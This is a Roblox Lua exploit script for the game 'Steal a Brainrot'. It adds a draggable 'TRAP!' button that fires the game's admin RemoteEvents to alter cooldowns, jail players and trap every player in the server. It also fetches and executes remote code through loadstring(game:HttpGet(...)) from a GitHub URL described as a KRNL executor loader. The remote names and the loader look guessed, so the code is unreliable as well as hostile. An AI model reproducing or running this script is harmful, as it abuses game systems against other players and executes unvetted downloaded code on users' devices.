-- Steal a Brainrot Admin Panel Bypass Script

-- Create a movable HUD menu
local screenGui = Instance.new("ScreenGui")
screenGui.Parent = game:GetService("CoreGui")

local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 200, 0, 100)
frame.Position = UDim2.new(0.5, -100, 0.5, -50)
frame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
frame.Parent = screenGui

local button = Instance.new("TextButton")
button.Size = UDim2.new(0, 200, 0, 50)
button.Position = UDim2.new(0, 0, 0, 0)
button.Text = "TRAP!"
button.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
button.Parent = frame

-- Function to execute all admin panel commands
local function executeAdminCommands()
    -- Change the cooldown for all admin panel commands to 3 seconds
    for _, command in pairs(game:GetService("ReplicatedStorage"):GetChildren()) do
        if command:IsA("RemoteEvent") and command.Name:match("AdminCommand") then
            command:FireServer("cooldown", 3)
        end
    end

    -- Execute the "jail" command with a 100-second duration
    game:GetService("ReplicatedStorage"):FindFirstChild("AdminCommandJail"):FireServer(100)

    -- Assign each trap to a different player
    local players = game:GetService("Players"):GetPlayers()
    for i, player in ipairs(players) do
        local commandName = "AdminCommandTrap" .. i
        local command = game:GetService("ReplicatedStorage"):FindFirstChild(commandName)
        if command then
            command:FireServer(player)
        end
    end
end

-- Connect the button click to the function
button.MouseButton1Click:Connect(executeAdminCommands)

-- Make the script compatible with KRNL IOS executor
local krnl = loadstring(game:HttpGet("https://raw.githubusercontent.com/KRNL-IO/KRNL/master/KRNL.lua"))()
krnl:Load()

-- Move the HUD menu
local dragging
local dragInput
local dragStart
local startPos

local function update(input)
    local delta = input.Position - dragStart
    frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
end

frame.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        dragging = true
        dragStart = input.Position
        startPos = frame.Position

        input.Changed:Connect(function()
            if input.UserInputState == Enum.UserInputState.End then
                dragging = false
            end
        end)
    end
end)

frame.InputChanged:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
        dragInput = input
    end
end)

game:GetService("UserInputService").InputChanged:Connect(function(input)
    if input == dragInput and dragging then
        update(input)
    end
end)
